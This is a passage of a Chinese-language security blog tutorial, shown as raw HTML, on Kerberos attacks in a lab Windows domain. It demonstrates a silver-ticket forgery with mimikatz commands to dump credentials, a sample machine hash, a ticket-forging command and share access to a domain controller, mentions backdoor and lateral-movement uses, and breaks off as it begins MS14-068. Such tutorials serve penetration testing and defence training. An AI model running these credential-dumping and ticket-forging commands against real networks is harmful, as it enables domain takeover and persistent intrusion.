0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521185512619</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图所示，成功注入黄金票据，此时进入 Shell 中可以成功查看 DC 中的文件：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dir \\DC\c$</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5072302558398221" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/12_QWPEASycPgadfAGsp9GPSQ0dwFeicw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBl0aEPNH0uOaxjI6RPk1oMpyHaVQWPEASycPgadfAGsp9GPSQ0dwFeicw/640?wx_fmt=png'" data-type="png" data-w="899" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521185733508</figcaption></figure><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">白银票据（Silver ticket）</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">白银票据不同于黄金票据，白银票据的利用过程是伪造 TGS，通过已知的授权服务密码生成一张可以访问该服务的 TGT。因为在票据生成过程中不需要使用 KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由 KDC 颁发 TGT，并且在生成伪造的 TGT 得20分钟内，TGS 不会对该 TGT 的真伪进行效验。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用 krbtgt 账号的密码哈希值，因此更加隐蔽。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">攻击者要利用白银票据进行票据传递攻击时，需要掌握下面几个信息：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域名</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域 SID</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>目标服务器的 FQDN</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>可利用的服务</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>服务账号的 NTLM 哈希值</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>要伪造的用户名</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">实验环境如下：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5695284159613059" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/13_Q87GKTTRZbAibniaJ1QGxEmX4IEVRA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlHxiaGUwpfwiacY80FpBtCN3JacU4Q87GKTTRZbAibniaJ1QGxEmX4IEVRA/640?wx_fmt=png'" data-type="png" data-w="827" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210522120058315</figcaption></figure><blockquote style="margin: 2em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgba(0, 0, 0, 0.5);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-left: none;padding: 1em;border-radius: 8px;background: rgb(247, 247, 247);"><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;">域成员主机：Windows 7</p><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>IP：192.168.93.20</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域名：whoamianony.org</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>用户名：bunny</span></p><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;">域控制器：Windows Server 2012</p><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>IP：192.168.93.30</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域名：whoamianony.org</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>用户名：administrator</span></p></blockquote><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">下面我们就使用白银票据来伪造 CIFS 服务权限，CIFS 服务通常用于Windows 主机之间的文件共享。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先登录域控，抓取机器账号的哈希值：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">privilege</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">debug</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">sekurlsa</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">logonpasswords</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.44025157232704404" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/14_AEqsrmy67iayDUF0Sx3hdcyRnRjILQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBl6ZzGicLIgo4Uk7AaMoRoFB2UTvAEqsrmy67iayDUF0Sx3hdcyRnRjILQ/640?wx_fmt=png'" data-type="png" data-w="795" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521092929785</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里的 NTLM 和 SHA1 都可以用。得到计算机账号的哈希为：6decb5d75eb5727d8535e67680b52571</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">（注意是 DC$ 用户的 NTLM 哈希，不是 Administrator 用户，因为要利用共享服务账号）</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后切换到普通域用户机器 Windows 7 中，使用 mimikatz 生成伪造的白银票据：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">golden </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">sid</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">S</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">21</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1315137663</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3706837544</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1429009142</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">target</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">DC</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">rc4</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">6decb5d75eb5727d8535e67680b52571</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">service</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cifs </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">administrastor </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ptt</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># kerberos::golden /domain:域名 /sid:域 SID /target:FQDN /rc4:server 机器的哈希 /service:可利用的服务 /user:要伪造的用户名 /ptt</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">注意这里的&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">/target</code>&nbsp;应为 FQDN 格式，即全称。</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.38948069241011984" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/15_ZGoqKPpwDWUsqj0Rj48wUx9HbicHyA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlS22u7to2lrs9CrbuibCnLlpX4aZGoqKPpwDWUsqj0Rj48wUx9HbicHyA/640?wx_fmt=png'" data-type="png" data-w="1502" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521093612632</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图所示，成功生成了伪造的白银票据，此时进行权限验证。如下，发现已经可以访问域控制器的共享目录了：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dir \\DC</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org\c$         </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">// 机器名要全称，注意是全称</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3511659807956104" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/16_SFAB0J5z2z4GecnmYWKuibCdwsXSAQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBl8LwCNU6c9e3iciaLMTsclGicibVHTSFAB0J5z2z4GecnmYWKuibCdwsXSAQ/640?wx_fmt=png'" data-type="png" data-w="729" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521093701774</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">通常情况下，黄金票据和白银票据更适合做为一个安装在普通域成员主机上的连接到域控的后门。但在内网横向移动中也经常遇到他的身影，通过黄金票据和白银票据，我们可以通过当前那下的机器作为跳板使用 psexec、wmi 等方式对目标机执行命令，也可以将生成的木马复制到目标机器上，然后通过计划任务或服务等方式执行，最终是目标机上线。</p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">MS14-068</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里就涉及到了我们上一节所讲到的 PAC 这个东西了。在上一节中，我们在关于 Kerberos 认证流程的介绍中提到了 PAC（Privilege Attribute Certificate）这个东西，这是微软为了访问控制而引进的一个扩展，即特权访问证书。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在 Kerberos 认证流程中，如果没有 PAC 的访问控制作用的话，只要用户的身份验证正确，那么就可以拿到 TGT，有了 TGT，就可以拿到 ST，有了 